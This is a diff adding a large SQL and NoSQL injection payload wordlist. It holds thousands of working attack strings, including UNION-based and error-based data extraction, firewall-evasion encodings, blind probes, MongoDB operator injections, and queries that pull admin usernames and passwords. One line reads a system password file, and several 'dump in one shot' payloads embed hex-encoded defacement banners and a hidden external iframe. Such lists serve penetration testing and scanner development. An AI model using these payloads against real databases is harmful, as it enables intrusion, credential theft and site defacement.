@@ -1,0 +1,4409 @@
+!
+"
+" "
+" #
+" --
+""
+"&"
+")
+"))
+"*"
+"-"
+"/*
+"^"
+#
+%
+&
+'
+'''
+'"'
+''''
+'%22
+'%27
+%22'
+%27'
+' #
+' '
+' --
+' –
+'"
+'"-*/'""'
+'#
+'&'
+''
+')
+'))
+'*'
+'-'
+'--
+'--' / "--" 
+'--' / "–"
+'/*
+'='
+'\"
+'^'
+(
+)
+))
+*/*
+*|
+,
+-'
+--
+.
+/
+/*…*/ 
+//
+//*
+;
+<>"'%;)(&+
+=
+==
+?
+\
+\\
+`
+``
+|
+||
+’) --
+%22
+%27
+%22%22%22
+%27%27%27
+%22%22
+%27%27
+'%22%22
+'%27%27
+%22'%22
+%27'%27
+%22%22%22%22%22%22%22%22%22%22
+%27%27%27%27%27%27%27%27%27%27
+'''''%22%22%22%22
+'''''%27%27%27%27
+''%22
+''%27
+%22''
+%27''
+1 and (cast(DB_NAME() as int)) like 1
+1%20and%20(cast(user_name()+as+int))+like+1
+’) — 
+' } ], $comment:'successful MongoDB injection'
+{"$gt": ""}
+{$gt: ''}
+[$ne]=1
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+', $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+'=0--+
+%00
+%0A%09UNION%0CSELECT%10NULL%
+0%a0union%a0select%09
+%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/
+%0AcOnCat()
+%0Aunion%0Aselect%0A
+0 or 1=1
+0.or-1%23
+0;return true
+0x730065006c0065006300740020004000400076006500 ...
+0x770061006900740066006F0072002000640065006C00 ...
+0x77616974666F722064656C61792027303A303A313027 ...
+[1]
+1"
+1'
+1*" 
+1/*'*/
+1, $where: '1 == 1'
+|| 1==1
+1'1
+1/*!1111'*/
+',1,1),(1,2,3,4,5)-- -
+',1,1),(1,2,3,4,(select 1 union select case when(substr(version(),1,1)=5) then 1 else 2 end))-- -
+1=1 union select password from zzz_user
+-1'%20and%20union%2Bdistinct%2Bselect%2B1%2B--%2B
+1%20and+extractvalue(rand(),concat(0x7e,version(),0x7e,user()))--
+1'%20GROUP%20BY%201%2C2%2C3--%2B
+1'%20or%20'1'%3D'1
+1'%20or%201%3D1%3B--
+1'%20ORDER%20BY%201--%2B
+-1'%20union%2Bdistinct%2Bselect%2B1%2B--%2B
++/*!12120%55%6e%49%6f%4e*/+(%53%65%4c%65%43%74+111,222,333,database(),555,...)+--+
+/*!12345%55nion*/ /*!12345%53elect*/ 1
+/*!12345%55nion*/(/*!12345%53elect*/ 1)
+/*!12345%55nion*/ /*!12345%53elect*/ 1,2
+/*!12345%55nion*/(/*!12345%53elect*/ 1,2)
+/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3)
+/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4
+/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4)
+/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5
+/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5)
+/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6
+/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6)
+/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6,7
+/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6,7)
+/*!1234%55nion*/ /*!12345%53elect*/ 1,2,3
+/**//*!12345cOnCat*/
+/*!12345GroUP_ConCat*/()
+/*!12345group_concat*/(/*!12345table_name*/)
+/*!12345#qa%0A#%0AUnIOn*/(/*!12345#qa%0A#%0ASeleCt*//**/1)+--+
+/*!12345UnioN*//**/(/*!12345seLECT*//**/1)+--
+/*!12345UNION*/(/*!12345SELECT*/ 1)
+/*!12345UNION*/(/*!12345SELECT*/ 1,2)
+/*!12345UNION*/(/*!12345SELECT*/ 1,2,3)
+/*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4)
+/*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5)
+/*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6)
+/*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6,7)
+/**//*!12345UNION SELECT*//**/
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+1234 ' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055
+-1'%2520and%2520union%252Bdistinct%252Bselect%252B1%252B--%252B
+1'%2520GROUP%2520BY%25201%252C2%252C3--%252B
+1'%2520or%2520'1'%253D'1
+1'%2520or%25201%253D1%253B--
+1'%2520ORDER%2520BY%25201--%252B
+-1'%2520union%252Bdistinct%252Bselect%252B1%252B--%252B
+-1'%25252525252525252520and%25252525252525252520union%2525252525252525252Bdistinct%2525252525252525252Bselect%2525252525252525252B1%2525252525252525252B--%2525252525252525252B
+1%2527 union select user(),schema(),4,5,6,7,%25278
+1%252Bunion%252Ball%252Bselect%252B1%252C2%252C3%252C4%252C5%252C6%252C7%252C8%252C9%252C10%252C11-
+-1%27%20.Ounion+distinct+select+1,2%27say%20vulnerable%27,4,5,6,7,8+--+
+1%27/**/%256fR/**50%2421%253D22%253B%2523
+1%2Bunion%2Ball%2Bselect%2B1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11-
+1337 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,’ SWVersion:’||SWVersion,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from version
+13 AND 0 /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,2,3,4,5 -
+13 AND 0 union select 1,2,3,4,5 -
+-1+/*!50000union*/+/*!50000selec*/+1,2,3,4,5,6,7+--+
+-1' +/*!50000UNION+SELECT+ALL*/+ 1,2,3,4,5,6,7,8,9 — -
+1' +/*!50000UNION+SELECT+ALL*/+ 1,2,database(),4,5,6,7,8,9 — -
+1*56
+%18%20or%201%3D1%20--
+-1' and .0union+distinct+select+1+--+
+1 and 1=1
+1') and '1'='1--
+1′) and '1′='1–
+1' and 1=(select count(*) from tablenames); --
+-1+AND+mod(29,9)+div+@a:=(/*!50000concat(database/**_**/(),"--","_Y000!_")*/)+/*!50000UNION*//**//*!50000DISTINCTROW*/+/*!50000SELECT*/+1,2,3,@a,"_Y000!_",6,7--+
+1+and+(SELECT+1+from+admin+limit+0,1
+1 AND (SELECT * FROM Users) = 1	
+1 AND (SELECT * FROM Users) = 1    
+1+and+(select+pass+from+users+limit+0,1
+1+and+(select+password+from+users+limit+0,1
+-1' and union+distinct+select+1+--+
+1'||'asd'||'  
+1-false
+1' GROUP BY 1,2,--+
+1' GROUP BY 1,2,3--+
+1;(load_file(char(47,101,116,99,47,112,97,115, ...
+1 or 1=1
+1' or '1'='1
+1' or 1=1;--
+-1 OR 3 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x******,0x****,0x****),NULL,NULL,NULL,NULL-- -21=6 AND 000123=000123
+1' ORDER BY 1--+
+1' ORDER BY 1,2--+
+1' ORDER BY 1,2,3--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1'
+1\'
+1 and 0' order by 1--+
+1'-- -
+1+--+
+-1)'
+1'--/**/-
+/^.*1'--+-.*$/
+/*!500001'--+-*/
+1'--/**/-
+1'--/*--*/-
+1'--/*&a=*/-
+1'--/*1337*/-
+1'--/**_**/-
+1'--%0A-
+1'--%0b-
+1'--%0d%0A-
+1'--%23%0A-
+1'--%23foo%0D%0A-
+1'--%23foo*%2F*bar%0D%0A-
+1'--#qa%0A#%0A-
+/*!20000%0d%0a1'--+-*/
+/*!blobblobblob%0d%0a1'--+-*/
+1' order by 1-- -
+1' order by 1 desc-- -  
+1' group by 1-- -  
+1' /**/ORDER/**/BY/**/ 1-- -  
+-1' /*!order*/+/*!by*/ 1-- -  
+1' /*!ORDER BY*/ 1-- -  
+1%0Aorder%0Aby%0A1-- -  
+1%23%0Aorder%23%0Aby%23%0A1-- -  
+1%23aa%0Aorder%23aa%0Aby%23aa%0A1-- -  
+1%23xyz%0Aorder%23xyz%0Aby%23xyz%0A1-- -  
+1%23foo%0D%0Aorder%23foo%0D%0Aby%23foo%0D%0A1-- -  
+1%23foo*%2F*bar%0D%0Aorder%23foo*%2F*bar%0D%0Aby%23foo*%2F*bar%0D%0A1-- - 
+1/*!f****U%0d%0a+order+by+*/1-- -  
+-1' /**/ORDER/**/BY/**/ 1-- -```)  
+1 /**/ORDER/**/BY/**/ 1-- -```)
+1 order by 5-- -
+1' Union Select 1,2,3,4-- -
+1'+UNION+ALL+SELECT+null,null,null,null--+-
+-1' div 0' Union Select 1,2,3,4-- -
+1' AND 0 Union Select 1,2,3,4-- -
+1+UNION+SELECT+1,2,3,4--+-
+1+UNION+ALL+SELECT+null,null,null,null--+-
+UNION(SELECT(1),(2),(3),(4))-- -
+1+Union Distinctrow Select+1,2,3,4-- -
+1+UNION+ALL+SELECT+1%2c2%2c3%2c4--+-
+Union Select CHAR(49),CHAR(50),CHAR(51),CHAR(52)-- -
+Union Select * from (select 1)a join(select 2)b join(select 3)c join(select 4)d-- -
+/*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,2,3,4-- -  
+%55nion(%53elect 1,2,3) 1,2,3,4-- -  
+1+union+distinctROW+select+1,2,3,4--+-  
+1+ #?uNiOn + #?sEleCt 1,2,3,4-- -  
++ #?1q %0AuNiOn all#qa%0A#%0AsEleCt 1,2,3,4-- -  
+/*!%55NiOn*/ /*!%53eLEct*/ 1,2,3,4-- -  
++un/**/ion+se/**/lect 1,2,3,4-- -  
++?UnI?On?+'SeL?ECT? 1,2,3,4-- -  
++(UnIoN)+(SelECT)+1,2,3,4--+-  
++UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4-- -  
+%55nion(%53elect 1,2,3,4)-- -  
+/**//*!12345UNION SELECT*//**/ 1,2,3,4-- -  
+/**//*!50000UNION SELECT*//**/ 1,2,3,4-- -  
+/**/UNION/**//*!50000SELECT*//**/ 1,2,3,4-- -  
+/*!50000UniON SeLeCt*/ 1,2,3,4-- 
+union /*!50000%53elect*/ 1,2,3,4-- -  
+/*!u%6eion*/ /*!se%6cect*/ 1,2,3,4-- -  
+/*--*/union/*--*/select/*--*/ 1,2,3,4-- -  
+union (/*!/**/ SeleCT */ 1,2,3,4)-- -  
+/*!union*/+/*!select*/ 1,2,3,4-- -  
+/**/uNIon/**/sEleCt/**/ 1,2,3,4-- -  
++%2F**/+Union/*!select*/ 1,2,3,4-- - 
+/**//*!union*//**//*!select*//**/ 1,2,3,4-- -  
+/*!uNIOn*/ /*!SelECt*/ 1,2,3,4-- -  
+/**/union/*!50000select*//**/ 1,2,3,4-- - 
+1+0%a0union%a0select%09 1,2,3,4-- -  
+1+%0Aunion%0Aselect%0A 1,2,3,4-- -  
+1+uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4-- -  
+1+%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/ 1,2,3,4-- -  
+1+/*!union*//*--*//*!all*//*--*//*!select*/ 1,2,3,4-- -  
+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C 1,2,3,4-- -
+1+/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4-- -  
+1+UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4-- -  
+1+union+sel%0bect 1,2,3,4-- -  
+1+#1q%0Aunion all#qa%0A#%0Aselect 1,2,3,4-- -  
+1+%23xyz%0AUnIOn%23xyz%0ASeLecT+ 1,2,3,4-- -  
+1+%23xyz%0A%55nIOn%23xyz%0A%53eLecT+ 1,2,3,4-- -  
+1+union(select(1),2,3)-- -  
+1+uNioN (/*!/**/ SeleCT */ 11) 1,2,3,4-- -  
+1+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/ 1,2,3,4-- -  
+1+%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/ 1,2,3,4-- -  
+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C 1,2,3,4-- -  
+1+/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/ 1,2,3,4-- -  
+1+UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4-- -  
+1+/*!UnIoN*/+/*!SeLeCt*/+ 1,2,3,4-- -  
+1+/*!u%6eion*/ /*!se%6cect*/ 1,2,3,4-- -  
+1+uni%20union%20/*!select*/%20 1,2,3,4-- -  
+1+union%23aa%0Aselect 1,2,3,4-- -  
+1/**/union/*!50000select*/ 1,2,3,4-- -  
+1+/^****union.*$/ /^****select.*$/ 1,2,3,4-- -  
+1+/*union*/union/*select*/select+ 1,2,3,4-- -  
+1 +/*!50000UnION*//*!50000SeLeCt*/ 1,2,3,4-- -  
+1+%252f%252a*/union%252f%252a /select%252f%252a*/ 1,2,3,4-- -  
+1+AnD null UNiON SeLeCt 1,2,3,4;%00-- -  
+1+AnD null UNiON SeLeCt 1,2,3,4+--+-  
+1+And False Union Select 1,2,3,4+--+-
+-7' UNION SELECT 1,2,3,4--+
+.7' UNION SELECT 1,2,3,4--+
+7' AND 0 UNION SELECT 1,2,3,4--+
+7' DIV 1 UNION SELECT 1,2,3,4--+
+concat/*!(0x223e,version(),(select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/
+concat/*!(0x3c68323e20496e6a656374657220414c49454e205348414e553c2f68323e,0x3c62723e,version(),(Select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/
+concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c696d67207372633d2268747470733a2f2f312e62702e626c6f6773706f742e636f6d2f2d456262354b36356f4a49552f56336171695854394671492f41414141414141414353452f76475977714c6c504f73733251574c376e335874794a5376515a2d367a41672d77434c63422f73313630302f486f77253242746f253242496e637265617365253242496e7465726e657425324242726f77736572732532425370656564253242696e25324255726475253242616e6425324248696e6469253242566964656f2532425475746f7269616c2e504e47223e3c666f6e7420636f6c6f723d7265642073697a653d353e3c623e4d722e73696c656e7420636f646572203c666f6e7420636f6c6f723d626c61636b2073697a653d343e2866336d6178293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c6669656c647365743e3c7374726f6e673e3c62723e3c63656e7465723e3c623e3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e20203c666f6e7420636f6c6f723d626c61636b3e,version(),0x7e20,@@version_comment,0x3c2f666f6e743e,0x3c62723e5072696d617279204461746162617365203c666f6e7420636f6c6f723d626c61636b3e20203a3a,@d:=database() ,0x3c2f666f6e743e ,0x3c62723e44617461626173652055736572203c666f6e7420636f6c6f723d626c61636b3e203a3a,user(),0x3c2f666f6e743e,0x3c2f623e3c62723e,(SELECT+GROUP_CONCAT(0x50726976696c656765732020203c666f6e7420636f6c6f723d626c61636b3e203a3a,GRANTEE,0x3a3a,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES),0x3c2f63656e7465723e3c2f7374726f6e673e3c2f6669656c647365743e,(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c6669656c647365743e3c6c6567656e643e,0x3c623e3c666f6e7420636f6c6f723d626c61636b3e,'Table Name',0x3c2f6c6567656e643e3c2f666f6e743e3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name, 0x3c623e3c666f6e7420636f6c6f723d677265656e3e3a3a20446174616261736520203c666f6e7420636f6c6f723d626c61636b3e5b,database(),0x5d3c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e3c2f623e3c2f6669656c647365743e))))x)))))*/
+(select+concat(0x3c666f6e7420666163653d43616d627269612073697a653d323e72306f74404833583439203a3a20,version(),0x3c666f6e7420636f6c6f723d7265643e3c62723e,0x446174616261736573203a7e205b,(Select+count(Schema_name)from(information_Schema.schemata)),0x5d3c62723e5461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)),0x5d3c62723e436f6c756d6e73203a7e205b,(Select+count(column_name)from(information_Schema.columns)),0x5d3c62723e,@)from(select(@:=0x00),(@db:=0),(@db_nr:=0),(@tbl:=0),(@tbl_nr:=0),(@col_nr:=0),(select(@)from(information_Schema.columns)where(@)in(@:=concat(@,if((@db!=table_schema),concat((@tbl_nr:=0x00),0x3c666f6e7420636f6c6f723d7265643e,LPAD(@db_nr:=@db_nr%2b1,2,0x20),0x2e20,@db:=table_schema,0x2020202020203c666f6e7420636f6c6f723d707572706c653e207b205461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)where(table_schema=@db)),0x5d7d203c2f666f6e743e3c2f666f6e743e),0x00),if((@tbl!=table_name),concat((@col_nr:=0x00),0x3c646976207374796c653d70616464696e672d6c6566743a343070783b3e3c666f6e7420636f6c6f723d626c75653e202020,LPAD(@tbl_nr:=@tbl_nr%2b1,3,0x0b), 0x2e20,@tbl:=table_name,0x20202020203c666f6e7420636f6c6f723d707572706c653e2020207b2020436f6c756d6e73203a7e20205b,(Select+count(column_name)from(information_Schema.columns)where(table_name=@tbl)),0x5d202f203c666f6e7420636f6c6f723d626c61636b3e205265636f726473203a7e205b,(Select+ifnull(table_rows,0x30)+from+information_schema.tables+where+table_name=@tbl),0x5d207d3c2f666f6e743e3c2f666f6e743e3c2f666f6e743e3c2f6469763e),0x00),concat(0x3c646976207374796c653d70616464696e672d6c6566743a383070783b3e3c666f6e7420636f6c6f723d677265656e3e,LPAD(@col_nr:=@col_nr%2b1,3,0x0b),0x2e20,column_name,0x3c2f666f6e743e3c2f6469763e)))))x)
+/*!50000ConCAt*//**/(0x3c63656e7465723e3c696d67207372633d2268747470733a2f2f692e6962622e636f2f59666b4d4d6d342f4d43532e706e67222077696474683d2233353022206865696768743d22333530223e,0x3c63656e7465723e3c666f6e7420636f6c6f723d626c75652073697a653d343e3c623e3c696e733e3c6c6567656e64207374796c653d22636f6c6f723a7265643b223e3e2d3d3e20496e6a656374656420427920416c69656e205368616e75207c204d616c6c7520437962657220536f6c6469657273203c3d2d3c203c2f6c6567656e643e3c2f696e733e3c6d61726b3e3c666f6e7420636f6c6f723d626c75653e7b204d4353207d3c2f666f6e743c2f6d61726b3e203c2f666f6e743e3c2f63656e7465723e3c2f623e3c62723e3c6d617271756565206265686176696f723d227363726f6c6c2220646972656374696f6e3d22766572746963616c22207363726f6c6c616d6f756e743d22313022207363726f6c6c64656c61793d223630222077696474683d2231303025223e202d2d3e204d414c4c5520435942455220534f4c444945525320212121203c2d2d203c2f666f6e743e3c623e3c2f623e3c2f6d6172717565653e3c2f666f6e743e3c62723e3c62723e,0x3c63656e7465723e3c68333e3c666f6e7420636f6c6f723d22726564223e56657273696f6e203a3a3a,version/***/(),0x3c62723e,0x55736572203a3a3a,user/**/(),0x3c62723e,0x6461746162617365203a3a3a,database/**/(),0x3c62723e,0x55554944204b657973203a3a3a,UUID/**/(),0x3c62723e,0x546d70646972203a3a3a,@@tmpdir/**/,0x3c62723e,0x64617461646972203a3a3a,@@datadir/**/,0x3c62723e,0x62617365646972203a3a3a,@@basedir/**/,0x3c62723e,0x53796d6c696e6b203a3a3a,@@GLOBAL.have_symlink/**/,0x3c62723e,0x53534c203a3a3a,@@GLOBAL.have_ssl/**/,0x3c62723e,0x706f7274203a3a3a,@@port/**/,0x3c62723e,0x736f636b6574203a3a3a,@@SOCKET/**/,0x3c62723e,0x706c7567696e646972203a3a3a,@@PLUGIN_DIR/***/,0x3c62723e7761697474696d656f7574203a3a3a,@@WAIT_TIMEOUT/***/,0x3c62723e747970656f73203a3a3a,@@VERSION_COMPILE_MACHINE/**/,0x3c62723e736572766572206f73203a3a3a,@@VERSION_COMPILE_OS/**/,0x3c62723e736574646972203a3a3a,@@CHARACTER_SETS_DIR/**/,0x3c62723e7265636f7665726f7074696f6e73203a3a3a,@@MYISAM_RECOVER_OPTIONS/**/,0x3c62723e636f6e6e656374696f6e203a3a3a,@@COLLATION_CONNECTION/**/,0x3c62723e6572726f726c6f67203a3a3a,@@LOG_ERROR/*_**/,0x3c62723e486f73746e616d65203a3a3a,@@hostname,0x3c62723e,0x3c696e733e3c64656c3e7b3c7375703e414c21334e3c2f7375703e204d414c4c5520435942455220534f4c44494552533c7375703e5348414e553c2f7375703e207d3c2f64656c3e3c2f696e733e3c2f666f6e743e,0x3c63656e7465723e3c68333e3c666f6e7420636f6c6f723d22726564223e416c69656e205368616e7520c2a920323031393c2f666f6e743e3c2f68333e3c68333e3c7072653e3c666f6e7420636f6c6f723d22626c7565223e7c204d43537c3c2f7072653e3c2f68333e2093c68333e3c7072653e3c666f6e7420636f6c6f723d22677265656e223e207c204d616c6c7520437962657220536f6c64696572737c3c2f666f6e743e3c2f7072653e3c2f68333e2093c68333e3c7072653e3c666f6e7420636f6c6f723d22677265656e223e207c20414c21334e207c3c2f666f6e743e3c2f7072653e3c2f68333e209203c62723e203c64697620636c6173733d22666f6f746572223e3c666f6e7420636f6c6f723d227768697465223e26636f70793b2032303139202d20efbfbd203c62723e3c2f6469763e203c62723e203c2f63656e7465723e209203c646976207374796c653d22646973706c61793a206e6f6e653b223e203c696672616d652077696474683d22302522206865696768743d223022207363726f6c6c696e673d226e6f22206672616d65626f726465723d226e6f22206c6f6f703d22747275652220616c6c6f773d226175746f706c617922207372633d2268747470733a2f2f632e746f7034746f702e6e65742f6d5f313038383976373562312e6d7033223e3c2f696672616d653e)
+concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/
+/*!00000concat*/(0x3c666f6e7420666163653d224963656c616e6422207374796c653d22636f6c6f723a7265643b746578742d736861646f773a307078203170782035707820233030303b666f6e742d73697a653a33307078223e496e6a6563746564206279204468346e692056757070616c61203c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d70696e6b2073697a653d353e44622056657273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20/*!00000from*/%20(select%20(@x:=0x00),(select%20(0)%20/*!00000from*/%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))
+1' Union Select concat/*!(0x223e,version(),(select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/,2,3,4-- -
+1' Union Select database(),2,3,4-- -
+1'and 1=convert(int,@@version)--
+1'and 1=cast(@@version as int)-- -
+1'and 1=convert(int,user_name())--
+1'and 1=cast(user_name as int)-- -
+1'and 1=convert(int,@@SERVERNAME())--
+1'and 1=cast(@@SERVERNAME as int)-- -
+1' and 1=(select username %2b ':' %2b password from AdminLogin for xml PATH("))-- -
+1' AND 4570=4570 AND 'ZeoB'='ZeoB
+65' AND 4570=4570 AND 'ZeoB'='ZeoBFalse
+1' AND (length(database())) = 15 --+
+1' AND (ascii(substr((select database()),1,1))) > 110 --+
+' AND (length((select username from users limit 0,1))) = 6 --+
+1' order by 1)--
+1' order by 1))--
+1' order by 1;%00
+1' order by 1));%00
+1' order by 1;%60
+1' order by 1%23
+1' order by 1%60
+1' order by 1%90
+1') order by 1
+1'%23/* order by 1
+1' order by 1") ;%00
+1' order by 1#--+
+1' order by 1'))%23
+1'/**/order/**/by/**/1--/**/-
+1'%23nuLL%0Aorder%23nuLL%0Aby%23nuLL%0A1--%23nuLL%0A-
+1'/*️*/order/*️*/by/*️*/1--/*️*/-
++OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1--+-
++AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -
++AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x6c69746f666c6578+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -
++AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x757365726e616d65+AND+table_schema=0x6c69746f666c6578+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -
++AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(admin_username)+AS+CHAR),0x7e))+FROM+litoflex.username+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -
+1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100-- -
+1' /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
+1' %55nion(%53elect 1,2,3) 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
